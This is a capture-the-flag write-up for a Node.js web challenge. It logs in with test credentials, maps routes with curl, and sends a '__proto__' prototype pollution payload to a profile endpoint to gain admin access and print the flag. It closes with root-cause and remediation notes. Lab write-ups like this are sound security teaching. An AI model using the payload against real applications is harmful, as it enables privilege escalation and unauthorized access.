# NodeJS Academy: Prototype Pollution

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Web |
| Vulnerability | Prototype Pollution |
| Status | Solved |

The application was a NodeJS Academy platform where a student account could log in, update a profile, and view a protected admin panel.

The goal was to access the admin area and recover the flag.

## Login

The test credentials were:

```text
etudiant / csia2026
```

Login request:

```bash
curl -i -c cookies.txt -b cookies.txt \
  -d "username=etudiant&password=csia2026" \
  https://csia-ctf26-prototype-pollution.chals.io/login
```

The response redirected to `/dashboard`:

```http
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: connect.sid=...
```

I followed the redirect:

```bash
curl -s -L -b cookies.txt \
  https://csia-ctf26-prototype-pollution.chals.io/dashboard \
  | tee dash.html
```

The dashboard contained a link to the admin panel:

```html
<a href="/admin">🔒 Admin</a>
```

## Route Discovery

I tested common routes:

```bash
for p in dashboard profile update settings api/profile api/update api/settings courses admin flag debug; do
  echo -e "\n=== /$p ==="
  curl -s -i -L -b cookies.txt \
    https://csia-ctf26-prototype-pollution.chals.io/$p | head -80
done
```

The `/profile` page revealed the endpoint used to update a profile:

```text
POST /api/profile
Content-Type: application/json
```

The page also showed client-side JavaScript sending JSON:

```js
const res = await fetch('/api/profile', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(payload)
});
```

## Exploitation: Prototype Pollution

The challenge name strongly suggested prototype pollution.

I sent a JSON object containing `__proto__` to pollute the global object prototype:

```json
{
  "__proto__": {
    "admin": true
  }
}
```

Exploit request:

```bash
curl -i -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"admin":true}}' \
  https://csia-ctf26-prototype-pollution.chals.io/api/profile
```

After the pollution, the application treated the current user as an administrator.

## Flag Retrieval

I accessed the admin panel:

```bash
curl -s -b cookies.txt \
  https://csia-ctf26-prototype-pollution.chals.io/admin
```

Direct extraction:

```bash
curl -s -b cookies.txt \
  https://csia-ctf26-prototype-pollution.chals.io/admin \
  | grep -oE 'CSIA\{[^}]+\}'
```

Output:

```text
CSIA{pr0t0typ3_p0llut10n_m4st3r}
```

## Flag

```text
CSIA{pr0t0typ3_p0llut10n_m4st3r}
```

## Root Cause

The vulnerability probably came from an unsafe merge between user-controlled JSON and the profile object.

Typical vulnerable examples:

```js
Object.assign(user.profile, req.body);
```

or:

```js
merge(user.profile, req.body);
```

If keys such as `__proto__`, `constructor`, and `prototype` are not blocked, an attacker can modify inherited properties.

If the application checks privileges like this:

```js
if (user.admin) {
  // admin access
}
```

then the polluted inherited property can bypass the access control.

## Remediation

- Filter dangerous keys: `__proto__`, `constructor`, `prototype`.
- Avoid unsafe recursive merge functions.
- Use `Object.create(null)` for objects that store user-controlled data.
- Check own properties explicitly:

```js
Object.hasOwn(user, "admin")
```

instead of:

```js
if (user.admin)
```

- Keep dependencies up to date.

## Summary

| Step | Action |
| --- | --- |
| 1 | Log in with `etudiant / csia2026` |
| 2 | Discover `/profile` |
| 3 | Identify `POST /api/profile` |
| 4 | Send `__proto__` payload |
| 5 | Pollute the prototype |
| 6 | Access `/admin` |
| 7 | Extract the flag |

